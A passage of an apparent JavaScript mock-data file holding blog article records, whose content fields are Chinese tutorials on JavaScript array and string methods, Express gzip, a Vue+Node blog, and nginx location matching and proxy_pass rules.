//["bbb", "ccc"]\n    // console.log(arr);   //["aaa", "ddd"]\n\n    // 在数组下标为1的位置，添加一项\'eee\'\n    // var res2 = arr.splice(1, 0, \'eee\')\n    // console.log(res2);  //[]\n    // console.log(arr);   //["aaa", "eee", "bbb", "ccc", "ddd"]\n\n    // 在数组下标为1的位置，添加两项\'eee\', \'fff\'\n    // var res2 = arr.splice(1, 0, \'eee\', \'fff\')\n    // console.log(res2);  //[]\n    // console.log(arr);   //["aaa", "eee", "fff", "bbb", "ccc", "ddd"]\n\n    // 在数组下标为1的位置，删除一个，添加两项\'eee\', \'fff\'\n    var res2 = arr.splice(1, 1, \'eee\', \'fff\')\n    console.log(res2);  //["bbb"]\n    console.log(arr);  //["aaa", "eee", "fff", "ccc", "ddd"]\n\n</script>\n```\n\n\n\n### 数组转字符串 - join()\n\n> join() 数组转字符串，通过指定的分隔符进行分隔的。返回一个字符串，不会修改原数组\n\n```js\nvar arr = [1, 2, 3, 4, 5]\nvar arrstr = arr.join(\'、\')\nconsole.log(arrstr);    //1、2、3、4、5\nconsole.log(arr);   //[1, 2, 3, 4, 5]\n```\n\n### 数组转换为字符串 - toString()\n\n> 把数组转换为字符串，并返回结果。\n\n```js\nvar arr = [1, 2, 3, 4, 5]\nconsole.log(arr.toString());    //1,2,3,4,5\n```\n\n### 排序 - sort()\n\n> sort() 方法用于对数组的元素进行排序。\n>\n> 排序顺序可以是字母或数字，并按升序或降序。\n>\n> 默认排序顺序为按字母升序。\n>\n> 会修改原数组\n\n```js\nvar arr1 = [\'a\', \'d\', \'b\', \'c\', \'e\']\nvar res3 = arr1.sort()\nconsole.log(res3);  //["a", "b", "d", "f", "g"]\nconsole.log(arr1);  //["a", "b", "d", "f", "g"]\n\nvar arr2 = [1, 3, 4, 6, 2, 5]\nvar res4 = arr2.sort((a, b) => {\n    return a - b\n    // return b-a   //[6, 5, 4, 3, 2, 1]\n})\nconsole.log(res4);  //[1, 2, 3, 4, 5, 6]\nconsole.log(arr2);  //[1, 2, 3, 4, 5, 6]\n```\n\n### 反转数组 - reverse()\n\n> 颠倒数组中元素的顺序。返回颠倒顺序后的数组，会修改原数组\n\n```js\nvar arr = [1, 2, 3, 4, 5]\nvar rearr = arr.reverse()\nconsole.log(rearr); // [5, 4, 3, 2, 1]\nconsole.log(arr);   // [5, 4, 3, 2, 1]\n```\n\n### 判断一个对象是否是数组 - isArray()\n\n> 如果对象是数组返回 true，否则返回 false。\n\n```js\nvar arr3 = [1, 2, 3]\nvar str = \'123\'\nconsole.log(Array.isArray(arr3));   //truejs\nconsole.log(Array.isArray(str));   //false\n```\n\n### 连接两个或多个数组 - concat()\n\n> concat()，该参数可以是具体的值，也可以是数组对象。可以是任意多个。\n>\n> 返回一个新的数组，不会修改原数组\n\n```js\nvar arr4 = [1, 2, 3]\nvar arr5 = [2, 3, 4]\n// var res = arr4.concat(arr5)\n// console.log(res); //[1, 2, 3, 2, 3, 4]\nvar res = arr4.concat(3,4,5)\nconsole.log(res);   //[1, 2, 3, 3, 4, 5]\n```\n\n### 遍历 - forEach(function) \n\n> 对数组的每个元素执行一次提供的函数，不会修改原数组\n\n```js\nvar arr = [\n    { id: 1, name: "小明" },\n    { id: 2, name: "小李" },\n    { id: 3, name: "小张" }\n]\narr.forEach(function (val, index) {\n    console.log("值", val)\n    console.log("索引", index)\n})\nconsole.log(arr) //不会修改原数组\n```\n\n\n\n# 伪数组\n\n将一个伪数组对象转换为一个真正的数组，必须具备以下条件：\n\n1、该类数组对象必须具有length属性，用于指定数组的长度。如果没有length属性，那么转换后的数组是一个空数组。\n\n2、该类数组对象的属性名必须为数值型或字符串型的**数字**\n\nps: 该类数组对象的属性名可以加引号，也可以不加引号\n\n```js\nlet arrayLike = {\n    0: \'tom\',\n    1: \'65\',\n    2: \'男\',\n    3: [\'jane\', \'john\', \'Mary\'],\n    \'length\': 4\n}\nlet arr1 = Array.from(arrayLike)\nconsole.log(arr1) // [\'tom\',\'65\',\'男\',[\'jane\',\'john\',\'Mary\']]\n\nlet arrayLike1 = {\n    name: \'tom\',\n    age: \'65\',\n    sex: \'男\',\n    friends: [\'jane\', \'john\', \'Mary\'],\n    \'length\': 4\n}\nlet arr2 = Array.from(arrayLike1)\nconsole.log(arr2) // [undefined, undefined, undefined, undefined]\n```\n\n# Array.from()\n\nArray.from()将伪数组对象(拥有一个 length 属性和若干索引属性的任意对象)或可迭代对象转换为真正的数组。\n\n```js\nlet arr = [1, 2, 3, 4, 4, 5, 3, 1]\narr = new Set(arr)\narr = Array.from(arr)\nconsole.log(arr);   //[1, 2, 3, 4, 5]\nlet str = \'12345\'\nstr = Array.from(str)\nconsole.log(str);   //["1", "2", "3", "4", "5"]\n```\n\n# 未完待续！',
      click: 5,
      createdAt: '2020-02-25T08:18:20.000Z',
      updatedAt: '2021-02-16T13:07:32.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 12,
            article_id: 12,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 12,
            user_id: 1,
            article_id: 12,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 1,
      title: '数组/对象',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '# 数组\n1. 创建数组\n\t1. var arr = new Array()\n\t2. var arr = []\n2. 索引数组\n```language\narr[0] = \'张三\'\narr[1] = 18\narr[2] = "男"\nconsole.log(arr)    //["张三", 18, "男"]\n```\n3. 关联数组\n```language\narr["name"] = \'张三\'\narr["age"] = 18\narr["sex"] = "男"\nconsole.log(arr)    //[name: "张三", age: 18, sex: "男"]\n```\n\n# 对象\n1. 创建对象\n```language\nperson = new Object();\nperson.firstname = "John";\nperson.lastname = "Doe";\nperson.age = 50;\nperson.eyecolor = "blue";\nconsole.log(person) //{firstname: "John", \nlastname: "Doe", age: 50, eyecolor: "blue"}\n```\n```language\nperson={firstname:"John",lastname:"Doe",age:50,eyecolor:"blue"}\nconsole.log(person) //{firstname: "John", lastname: "Doe", age: 50, eyecolor: "blue"}\n```\n```language\n//使用对象构造器\nfunction person(firstname,lastname,age,eyecolor){\n    this.firstname=firstname;\n    this.lastname=lastname;\n    this.age=age;\n    this.eyecolor=eyecolor;\n}\nmyFather=new person("John","Doe",50,"blue");\nmyMother=new person("Tim","li",48,"white");\nconsole.log(myFather)  //person {firstname: "John", lastname: "Doe", age: 50, eyecolor: "blue"}\nconsole.log(myMother)  //person {firstname: "Tim", lastname: "li", age: 48, eyecolor: "white"}\n```\n\n\n',
      click: 18,
      createdAt: '2020-02-24T07:48:58.000Z',
      updatedAt: '2021-02-16T13:01:55.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 1,
            article_id: 1,
            type_id: 1,
            createdAt: '2021-02-16T11:20:10.000Z',
            updatedAt: '2021-02-16T11:20:10.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 1,
            user_id: 1,
            article_id: 1,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 2,
      title: '常用字符串方法',
      is_comment: 1,
      status: 1,
      img: '/1596883578946string.jpg',
      content:
        '# 常用字符串方法：\n1. length字符串的长度\n2. indexOf()返回某个指定的字符串值在字符串中首次出现的位置。\n3. slice()提取字符串的片断\n4. toLowerCase()把字符串转换为小写\n5. toUpperCase()把字符串转换为大写\n6. replace()方法用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串。\n7. split() 方法用于把一个字符串分割成字符串数组。\n8. trim() 方法用于删除字符串的头尾空格。\n\n# 实例：\n```language\nvar str = "abcdefg"\nconsole.log(str.length) //字符串长度7\nconsole.log(str.indexOf("a")) // 0,返回指定的字符串值在字符串中首次出现的位置,找不到返回-1\nconsole.log(str.slice(0,3)) //abc,提取字符串的片断,从下标为0至下标为3以前的数据\nconsole.log(str.slice(3)) //defg,提取字符串的片断,从下标为3至最后的数据\nconsole.log(str.slice(-3,6)) //ef,提取字符串的片断,从最后第三个至下标为6以前的数据\nconsole.log(str.slice(-3,-1)) //ef,从最后第三个至最后第一个以前的数据\nconsole.log(str.slice(-3,-6)) //空\n//小技巧,提取后三个字符串\nconsole.log(str.slice(-3,str.length)) //efg,从最后第三个至下标为7以前的数据\n//小技巧,提取前三个字符串\nconsole.log(str.slice(-str.length,3)) //abc,从最后第三个至下标为7以前的数据\nconsole.log(str.replace(\'a\',\'b\')) //bbcdefg\nconsole.log(str.toLocaleLowerCase()) //abcdefg\nconsole.log(str.toUpperCase()) //ABCDEFG\nconsole.log(str.split("")) //["a", "b", "c", "d", "e", "f", "g"]\nconsole.log(str.trim()) //abcdefg\n```\n',
      click: 7,
      createdAt: '2020-02-24T07:48:58.000Z',
      updatedAt: '2021-02-16T13:03:27.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 2,
            article_id: 2,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 2,
            user_id: 1,
            article_id: 2,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 3,
      title: 'node开启gzip',
      is_comment: 1,
      status: 1,
      img: '/1596884057444nodejs.jpg',
      content:
        "```javascript\nvar express = require('express')\nvar compression = require('compression');\nvar app = express()\n\napp.use(compression())\t// 需要位于 express.static 前面，否则不起作用\n\napp.use(express.static('dist'))\t// dist 文件夹中的静态资源都将被做 gzip 处理\n\napp.listen('3003', function () {\n  console.log('running......')\n})\n```",
      click: 23,
      createdAt: '2020-02-24T07:48:58.000Z',
      updatedAt: '2021-02-16T13:03:51.000Z',
      types: [
        {
          id: 2,
          name: '后端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 3,
            article_id: 3,
            type_id: 2,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 3,
            user_id: 1,
            article_id: 3,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 2,
          name: 'Node',
          color: '#089910',
          createdAt: '2020-07-03T12:55:09.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
      ],
    },
    {
      id: 4,
      title: 'Vue+Node个人博客',
      is_comment: 1,
      status: 1,
      img: '/1578937683585vueblog.jpg',
      content:
        '# 一个用Vue+Node开发的博客\n## 介绍\n1. 采用了前后端分离的方式,[前台](https://github.com/galaxy-s10/nuxtblog-client)和[后台](https://github.com/galaxy-s10/vueblog-admin)的源码在这里\n2. 博客的ui设计参考了各大博客主题的ui,使用了element-ui快速开发,主打简洁\n\n## 功能\n1. 注册/登录\n2. 留言/回复\n3. 模糊查询\n4. 后台管理(需管理员权限)\n\n## 技术栈\n### 前端(基于vue-cli3开发)\n> vue全家桶  axios  element-ui nuxt\n\n### 后台(基于vue-element-template开发)\n>  vue全家桶  axios  vue-element-template qiniu-js\n\n### 后端(基于node开发)\n> node express sequeilze mysql',
      click: 41,
      createdAt: '2020-02-24T07:48:58.000Z',
      updatedAt: '2021-02-16T13:19:51.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 4,
            article_id: 4,
            type_id: 3,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 4,
            user_id: 1,
            article_id: 4,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 12,
          name: 'vue-router',
          color: 'rgba(131, 109, 184, 1)',
          createdAt: '2020-07-04T16:03:11.000Z',
          updatedAt: '2020-07-04T16:03:11.000Z',
        },
        {
          id: 13,
          name: 'vuex',
          color: 'rgba(23, 113, 115, 1)',
          createdAt: '2020-07-05T05:46:07.000Z',
          updatedAt: '2020-07-05T05:46:07.000Z',
        },
        {
          id: 3,
          name: 'Sequelize',
          color: '#2379bd',
          createdAt: '2020-07-03T12:55:09.000Z',
          updatedAt: '2020-07-03T12:55:09.000Z',
        },
        {
          id: 2,
          name: 'Node',
          color: '#089910',
          createdAt: '2020-07-03T12:55:09.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
      ],
    },
    {
      id: 8,
      title: 'Nginx命令，匹配规则',
      is_comment: 1,
      status: 1,
      img: '/1581243836237nginx.jpg',
      content:
        '# 常用命令\n\n> nginx 启动nginx\n>\n> nginx -v 查看nginx版本\n>\n> nginx -t 测试配置文件语法正确性\n>\n> nginx -s stop 快速关闭Nginx，可能不保存相关信息，并迅速终止web服务\n>\n> nginx -s quit 平稳关闭Nginx，保存相关信息，有安排的结束web服务\n>\n> nginx -s reload 重新载入nginx，当配置信息修改需要重新加载配置是使用\n>\n> taskkill /fi "imagename eq nginx.EXE" /f     window下杀掉所有nginx进程\n\n# location\n\n##  匹配规则\n\n| 符号 | 说明                                               |\n| ---- | -------------------------------------------------- |\n| `~`  | 正则匹配，区分大小写                               |\n| `~*` | 正则匹配，不区分大小写                             |\n| `^~` | 和无修饰符类似，但是如果有^~，一旦匹配到就终止匹配 |\n| `=`  | 普通字符匹配，精确匹配                             |\n|      | 无修饰符，根据前缀匹配                             |\n\n## 匹配优先级顺序\n\n1、nginx首先检查基于前缀的location匹配(即不包含正则表达式的匹配)\n\n2、如果有使用=修饰符的location块与请求的URL完全匹配,则立刻使用该location响应请求\n\n3、如果没有找到带有=修饰符的location块匹配,则会继续计算非精确前缀,根据给定的URI找到最长匹配前缀,举个例子，nginx有/static和/static/js两个匹配路径，浏览器请求/static/js/aaa，这个路径都是/static前缀和/static/js/前缀，但是会选最长的/static/js/，然后保存起来\n\n4、判断保存的location带不带 ^\\~，如果带有 ^\\~，则使用该location，并不再继续匹配，如果没有带 ^\\~，则继续匹配\n\n5、在确定并储存最长匹配的前缀location块后,nginx继续检查正则表达式匹配location(区分大小写/不区分大小写)，如果存在正则表达式满足要求的匹配,则会选择与请求的URI匹配的第一个正则表达式的location来相应请求\n\n5、如果没有找到与请求的URI匹配的正则表达式location,则使用之前存储的最长前缀location响应请求\n\n## 注意\n\n通常情况下,一旦选择使用某一个location响应请求,那么请求将会在该location内部进行处理,而与其他location无关.但是location中某些指令会触发新的location匹配,比如：\n\n（1）try_files\n\n（2）rewrite\n\n（3）error_page\n\n匹配的顺序是**先匹配普通字符串**，然后**再匹配正则表达式**。\n\n另外**普通字符串匹配顺序是根据配置中字符长度从长到短**，也就是说**使用普通字符串配置的location顺序是无关紧要的**，反正最后**nginx会根据配置的长短来进行匹配**，但是需要注意的是，**正则表达式按照配置文件里的顺序匹配。找到第一个匹配的正则表达式将停止搜索**。\n\n## 匹配顺序案例\n\n```nginx\nlocation / {\n    default_type application/json ;\n    return 200  \'{"name":"/","result":"/-success"}\';\n}\n\n\nlocation /gethome1 {\n    default_type application/json ;\n    return 200  \'{"name":"gethome1","result":"gethome1-success"}\';\n}\n\nlocation /gethome {\n    default_type application/json ;\n    return 200  \'{"name":"gethome","result":"gethome-success"}\';\n}\n\nlocation ^~ /gethome100 {\n    default_type application/json ;\n    return 200  \'{"name":"^~ /gethome100","result":"^~ /gethome100-success"}\';\n}\n```\n\n上面的匹配顺序优先级： **^~ /gethome100 > /gethome1 > /gehome>  /**，优先级和书写顺序无关。\n\n如果地址栏上输入/gethome，先精准匹配，没有=，继续前缀匹配，找到/gethome1，/gethome，^~ /gethome100，但只有/gethome是/gethome的前缀，因此保存/gethome，继续后面的正则匹配，但是后面没有了，因此最终就是匹配到/gethome\n\n如果地址栏上输入/gethome1，先精准匹配，没有=，继续前缀匹配，找到/gethome1，/gethome，^~ /gethome100，其中/gethome1和/gethome都是/gethome1的前缀，保存最长的，因此保存/gethome1，继续后面的正则匹配，但是后面没有了，因此最终就是匹配到/gethome1\n\n如果地址栏上输入/gethome100，先精准匹配，没有=，继续前缀匹配，找到/gethome1，/gethome，^~ /gethome100，这三个都是/gethome100的前缀，保存最长的，因此保存/gethome100，而且/gethome100前面有^~前缀，直接使用这个匹配结果，不再继续匹配。\n\n如果地址栏上输入/gethome100123，先精准匹配，没有=，继续前缀匹配，找到/gethome1，/gethome，^~ /gethome100，这三个都是/gethome100123的前缀，保存最长的，因此保存/gethome100，而且/gethome100前面有^~前缀，直接使用这个匹配结果，不再继续匹配。\n\n```nginx\n#location /gethobby {\n#    default_type application/json ;\n#    return 200  \'{"name":"gethome","result":"gethome-success"}\';\n#}\n\nlocation ^~ /gethobby { # location ^~/gethobby 空格不影响\n    default_type application/json ;\n    #return 状态码 数据\n    return 200  \'{"name":"^~/gethobby","result":"^~/gethobby-success"}\';\n}\n\nlocation ^~ /gethobby100 { # location ^~/gethobby100 空格不影响\n    default_type application/json ;\n    #return 状态码 数据\n    return 200  \'{"name":"^~/gethobby100","result":"^~/gethobby100-success"}\';\n}\n```\n\nnginx不能同时写两个 /gethobby 和 ^~ /gethobby，否则会报错：nginx: [emerg] duplicate location "/gethobby"\n\n匹配结果：\n\n> 当浏览器地址栏输入：/gethobby时候，会匹配到^~ /gethobby\n>\n> 当浏览器地址栏输入：/gethobby123时候，会匹配到^~ /gethobby\n>\n> 当浏览器地址栏输入：/gethobby100时候，会匹配到^~ /gethobby100\n>\n> 当浏览器地址栏输入：/gethobby100123时候，会匹配到^~ /gethobby100\n\n## 普通字符匹配和^~普通字符匹配区别\n\n```nginx\nlocation / {\n    default_type application/json ;\n    return 200  \'{"name":"/","result":"/-success"}\';\n}\n\nlocation ^~ /static {\n    default_type application/json ;\n    return 200  \'{"name":"static","result":"static-success"}\';\n}\n\nlocation ~ (jpg|jpeg|png|gif|mp3|mp4)$ {    #匹配以jpg|jpeg|png|gif|mp3|mp4结尾的路径\n    default_type application/json ;\n    return 200  \'{"name":"正则匹配区分大小写","result":"正则匹配区分大小写-success"}\';\n}\n```\n\n地址栏：/static/musicmp3，先匹配 ^~ /static，命中匹配，不会继续匹配下面的正则，结果就是匹配到^~ /static\n\n地址栏：/static/musicmp5，先匹配 ^~ /static，命中匹配，不会继续匹配下面的正则，结果就是匹配到^~ /static\n\n```nginx\nlocation / {\n    default_type application/json ;\n    return 200  \'{"name":"/","result":"/-success"}\';\n}\n\nlocation /static {\n    default_type application/json ;\n    return 200  \'{"name":"static","result":"static-success"}\';\n}\n\nlocation ~ (jpg|jpeg|png|gif|mp3|mp4)$ {    #匹配以jpg|jpeg|png|gif|mp3|mp4结尾的路径\n    default_type application/json ;\n    return 200  \'{"name":"正则匹配区分大小写","result":"正则匹配区分大小写-success"}\';\n}\n```\n\n地址栏：/static/musicmp3，先匹配  /static，命中匹配，继续匹配下面的正则，命中~ (jpg|jpeg|png|gif|mp3|mp4)$，则结果就是匹配到~ (jpg|jpeg|png|gif|mp3|mp4)$\n\n地址栏：/static/musicmp5，先匹配  /static，命中匹配，继续匹配下面的正则，不符合~ (jpg|jpeg|png|gif|mp3|mp4)$，则结果就是匹配到/static\n\n# 关于loalhost后面的/\n\n## 当location后面有/时\n\n```nginx\nserver {\n    listen 90;\n    server_name localhost;\n    \n    location / {\n        default_type application/json ;\n        return 200  \'{"name":"测试/","result":"测试/-success"}\';\n    }\n    \n    location /test/ {\n        default_type application/json ;\n        return 200  \'{"name":"测试test","result":"测试test-success"}\';\n    }\n}\n```\n\n浏览器输入http://127.0.0.1:90/test时，匹配到/，匹配不到/test/\n\n浏览器输入http://127.0.0.1:90/test/时，匹配到/test/，匹配不到/\n\n浏览器输入http://127.0.0.1:90/test/aaa时，匹配到/test/，匹配不到/\n\n浏览器输入http://127.0.0.1:90/testaaa时，匹配到/，匹配不到/test/\n\n浏览器输入http://127.0.0.1:90/test/aaa/aaa时，匹配到/test/，匹配不到/\n\n## 当location后面没有/时\n\n```nginx\nserver {\n    listen 90;\n    server_name localhost;\n    \n    location / {\n        default_type application/json ;\n        return 200  \'{"name":"测试/","result":"测试/-success"}\';\n    }\n\n    location /test {\n        default_type application/json ;\n        return 200  \'{"name":"测试","result":"success"}\';\n    }\n}\n```\n\n浏览器输入http://127.0.0.1:90/test时，匹配到/test，匹配不到/\n\n浏览器输入http://127.0.0.1:90/test/时，匹配到/test，匹配不到/\n\n浏览器输入http://127.0.0.1:90/test/aaa时，匹配到/test，匹配不到/\n\n浏览器输入http://127.0.0.1:90/testaaa时，匹配到/test，匹配不到/\n\n浏览器输入http://127.0.0.1:90/test/aaa/aaa时，匹配到/test，匹配不到/\n\n```nginx\nlocation /chat {\n    proxy_pass http://localhost:5001;\n}\n```\n\nhttp://localhost/chat  ===> http://localhost:5001/chat\n\nhttp://localhost/chat/  ===> http://localhost:5001/chat\n\nhttp://localhost/chat/chat  ===> http://localhost:5001/chat/chat\n\n```nginx\nlocation /chat {\n    proxy_pass http://localhost:5001/;\n}\n# ===> proxy_pass + 原url匹配的location路径之后的内容\n```\n\nhttp://localhost/chat  ===> http://localhost:5001/\n\nhttp://localhost/chat/  ===> http://localhost:5001//\n\nhttp://localhost/chat/chat  ===> http://localhost:5001//chat\n\n## 结论\n\n> 当location后面有/时，只能访问test/ 以及test/xxx等路径。\n>\n> 当location后面没有/时，可以访问test开头的任意路径。\n\n# proxy_pass\n\n在nginx中配置proxy_pass代理转发时，如果在proxy_pass后面的url加/，表示绝对根路径，会把匹配到的路径部分去掉（即不带到代理地址上）\n\n如果没有/，表示相对路径，把匹配的路径部分也给代理走（即把匹配到的部分也带到代理地址上）。\n\n> 监听5001端口\n\n```nginx\nserver {\n    listen       5001;\n    server_name  localhost;\n    gzip on;\n    # 进行压缩的文件类型。\n    gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;\n    # 是否在http header中添加Vary: Accept-Encoding，建议开启\n    gzip_vary on;\n    location / {\n        default_type application/json ;\n        return 200  \'{"name":"5001/","result":"5001/-success"}\';\n    }\n    location /xxx {\n        default_type application/json ;\n        return 200  \'{"name":"5001/xxx","result":"5001/xxx-success"}\';\n    }\n    location /xxx/ {\n        default_type application/json ;\n        return 200  \'{"name":"5001/xxx/","result":"5001/xxx/-success"}\';\n    }\n\n}\n```\n\n> 监听5002端口\n\n```nginx\nserver {\n    listen       5002;\n    server_name  localhost;\n    gzip on;\n    # 进行压缩的文件类型。\n    gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;\n    # 是否在http header中添加Vary: Accept-Encoding，建议开启\n    gzip_vary on;\n    location / {\n        default_type application/json ;\n        return 200  \'{"name":"5002/","result":"5002/-success"}\';\n    }\n\n    location /xxx {\n        proxy_pass http://localhost:5001;\n    }\n    location /xxx/ {\n        proxy_pass http://localhost:5001;\n    }\n}\n```\n\n## proxy_pass末尾没有斜杠\n\n> 5001端口\n\n```nginx\nserver {\n        listen       5001;\n        server_name  localhost;\n\t\tgzip on;\n\t    # 进行压缩的文件类型。\n\t   \tgzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;\n\t    # 是否在http header中添加Vary: Accept-Encoding，建议开启\n\t    gzip_vary on;\n\t\tlocation / {\n            default_type application/json ;\n            return 200  \'{"name":"5001/","result":"5001/-success"}\';\n        }\n        location /xxx {\n            default_type application/json ;\n            return 200  \'{"name":"5001/xxx","result":"5001/xxx-success"}\';\n        }\n        location /xxx/ {\n            default_type application/json ;\n            return 200  \'{"name":"5001/xxx/","result":"5001/xxx/-success"}\';\n        }\n        location /yyy {\n            default_type application/json ;\n            return 200  \'{"name":"5001/yyy","result":"5001/yyy-success"}\';\n        }\n        location /aaa {\n            default_type application/json ;\n            return 200  \'{"name":"5001/aaa","result":"5001/aaa-success"}\';\n        }\n        location /yyy/aaa {\n            default_type application/json ;\n            return 200  \'{"name":"5001/yyy/aaa","result":"5001/yyy/aaa-success"}\';\n        }\n        location /aaa/yyy {\n            default_type application/json ;\n            return 200  \'{"name":"5001/aaa/yyy","result":"5001/aaa/yyy-success"}\';\n        }\n\n    }\n```\n\n> 5002端口\n\n```nginx\nserver {\n    listen       5002;\n    server_name  localhost;\n    gzip on;\n    # 进行压缩的文件类型。\n    gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;\n    # 是否在http header中添加Vary: Accept-Encoding，建议开启\n    gzip_vary on;\n    location / {\n        default_type application/json ;\n        return 200  \'{"name":"5002/","result":"5002/-success"}\';\n    }\n\n    location /xxx {\n        proxy_pass http://localhost:5001;\n    }\n    location /xxx/ {\n        proxy_pass http://localhost:5001;\n    }\n    location /yyy {\n        proxy_pass http://localhost:5001/aaa;\n    }\n    location /aaa {\n        proxy_pass http://localhost:5001/aaa/yyy;\n    }\n}\n```\n\n浏览器地址栏：http://localhost:5002/xxx或者http://localhost:5002/xxx123，匹配到nginx中5002端口的/xxx（因为/xxx是/xxx的前缀，不是/xxx/的前缀，因为少了一个/），然后匹配到的该路径又代理到了5001端口，且没有带/，即相对路径，会将/xxx带给http://localhost:5001，实际代理到：http://localhost:5001/xxx\n\n浏览器地址栏：http://localhost:5002/xxx/或者http://localhost:5002/xxx/123，匹配到nginx中5002端口的/xxx/（因为/xxx和/xxx/都是/xxx的前缀，但取最长的/xxx/），然后匹配到的该路径又代理到了5001端口，且没有带/，即相对路径，会将/xxx/带给http://localhost:5001，实际代理到：http://localhost:5001/xxx/\n\n浏览器地址栏：http://localhost:5002/yyy，匹配到nginx中5002端口的/yyy，注意，此时虽然proxy_pass的URL最后没有带/，但是，它有URI，因此不能把/yyy带到这个URL的后面，不能匹配到http://localhost:5001/aaa/yyy，也不会匹配到：http://localhost:5001/yyy/aaa，只能匹配到：http://localhost:5001/aaa\n\n浏览器地址栏：http://localhost:5002/aaa，匹配到nginx中5002端口的/aaa，注意，此时虽然proxy_pass的URL最后没有带/，但是，它有URI，因此不能把/aaa带到这个URL的后面，不能匹配到http://localhost:5001/aaa/yyy/aaa，也不会匹配到：http://localhost:5001/aaa/aaa/yyy，只能匹配到：http://localhost:5001/aaa/yyy\n\n## proxy_pass末尾有斜杠\n\n> 5002端口\n\n```nginx\nserver {\n    listen       5002;\n    server_name  localhost;\n    gzip on;\n    # 进行压缩的文件类型。\n    gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;\n    # 是否在http header中添加Vary: Accept-Encoding，建议开启\n    gzip_vary on;\n    location / {\n        default_type application/json ;\n        return 200  \'{"name":"5002/","result":"5002/-success"}\';\n    }\n\n    location /xxx {\n        proxy_pass http://localhost:5001/;\n    }\n    location /xxx/ {\n        proxy_pass http://localhost:5001/;\n    }\n    location /yyy {\n        proxy_pass http://localhost:5001/aaa/;\n    }\n    location /aaa {\n        proxy_pass 